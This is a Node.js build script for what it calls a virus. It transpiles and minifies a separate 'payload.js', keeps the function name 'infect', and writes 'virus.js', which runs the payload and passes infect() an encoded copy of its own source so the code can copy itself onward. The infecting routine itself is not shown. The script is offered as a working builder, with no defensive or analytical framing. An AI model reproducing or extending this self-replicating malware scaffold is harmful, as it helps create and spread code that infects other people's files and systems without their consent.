const fsp     = require( "fs-promise" );
const winston = require( "winston" );
const ugly    = require( "uglify-js" );
const babel   = require( "babel-core" );

async function build() {
    var src  = await fsp.readFile( "payload.js", "utf8" );
    var compiledES16 = babel.transform( src, { presets : require.resolve( "babel-preset-es2017" ) } ).code;
    var payload = encodeURI( ugly.minify( compiledES16, { fromString : true, mangle : { except : [ "infect" ] } } ).code );

    await fsp.writeFile( "virus.js", `(function() {
        ${decodeURI(payload)} 
        infect( "${payload}" );
    })();` );
}

build()
    .then( () => winston.info( "BUILD SUCCEEDED" ) )
    .catch( e => winston.info( "BUILD FAILED", e ) );
